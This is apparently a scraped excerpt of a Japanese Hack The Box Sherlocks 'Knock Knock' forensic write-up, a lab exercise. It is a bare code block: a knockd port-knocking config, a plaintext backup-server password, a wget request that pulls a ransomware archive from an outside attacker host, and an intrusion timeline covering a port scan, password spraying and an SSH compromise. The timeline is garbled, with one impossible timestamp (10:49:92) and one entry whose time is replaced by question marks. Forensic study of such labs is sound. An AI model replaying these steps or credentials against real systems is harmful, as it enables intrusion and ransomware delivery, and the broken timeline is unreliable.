# Hack The Box Sherlocks の勧め / Knock Knock Writeup

> 原文: https://www.ctfiot.com/150113.html
> ID: 150113


```
[options]
 UseSyslog

[FTP-INTERNAL]
 sequence = 29999,50234,45087
 seq_timeout = 5
 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
 tcpflags = syn

# Creds for the other backup server abdullah.yasin:
XhlhGame_90HJLDASxfd&hoooad
GET /PKCampaign/Targets/Forela/Ransomware2_server.zip HTTP/1.1
Host: 13.233.179.35
User-Agent: Wget/1.21.2
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
2023-03-20T23:37:
35Z | パケット取得開始
2023-03-21T10:42:
23Z | 3.109.209.43からポートスキャン開始
2023-03-21T10:42:
26Z | 3.109.209.43からポートスキャン終了
2023-03-21T10:49:
92Z | 3.109.209.43から21/tcpのFTPサーバに対しパスワードスプレー開始
2023-03-21T10:51:
04Z | 3.109.209.43から21/tcpのFTPサーバにtony.shephardでログイン成功
2023-03-21T10:55:
20Z | 3.109.209.43から21/tcpのFTPサーバにtony.shephardで接続終了
2023-03-21T10:58:
50Z | 3.109.209.43から24456/tcpのFTPサーバにabdullah.yasinでログイン成功
2023-03-21T11:10:
21Z | 3.109.209.43から24456/tcpのFTPサーバにabdullah.yasinで接続終了
???????????????????? | https://github.com/forela-finance/forela-dev/commit/ab04702b3269f016def0521a734380fb12596994 からSSHの認証情報を取得
2023-03-21T11:25:
42Z | 3.109.209.43から22/tcpのSSHサーバに接続
2023-03-21T11:42:
34Z | wgetコマンドでhttp://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_server.zipをダウンロード
2023-03-21T11:49:
17Z | 3.109.209.43から22/tcpのSSHサーバに接続
2023-03-22T02:17:
48Z | パケット取得終了
```
